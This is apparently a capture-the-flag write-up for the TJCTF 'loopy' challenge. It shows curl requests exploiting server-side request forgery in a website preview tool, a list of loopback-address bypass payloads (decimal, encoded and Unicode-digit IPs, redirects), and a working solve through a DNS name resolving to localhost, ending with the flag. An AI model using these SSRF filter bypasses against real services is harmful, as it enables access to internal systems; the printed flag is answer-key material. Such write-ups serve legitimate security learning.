* Recon SSRF

```
% curl -X POST -d "url=http://127.0.0.1:5000/admin" https://loopy.tjc.tf/
Access denied. URL parameter included one or more of the following banned keywords: [::], 017700000001, 0.0.0.0, ffff, ::1, 2130706433, local, 127%                    
```

* Other payloads - tried 301/302 redirects 

```
   nxt_url = "http://127.0.0.1";
   nxt_url = "http://3627734755";
   nxt_url = "http://0%2e0%2e0%2e0:5000";
   nxt_url = "http://0:5000";
   nxt_url = "http://①②⑦.⓪.⓪.⓪.①:5000";
```

* Solve with dns resol

```
% curl -X POST -d "url=http://self.5r1.org:5000/admin" https://loopy.tjc.tf/
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>loopy</title>
        <style>
            body{
                color: white;
                background-color: rgb(52, 52, 52);
            }
        </style>
    </head>
    <body>
        <h1>Website Preview Tool</h1>
        <p>Use this tool to get a preview of the HTML content of a website!</p>
        <form action="/" method="POST">
            <input type="url" name="url" placeholder="Input a URL here">
            <button type="submit">Submit</button>
        </form>
        <h3> Your page: tjctf{i_l0v3_ssssSsrF_9o4a8}
 </h3>
    </body>
</html>
```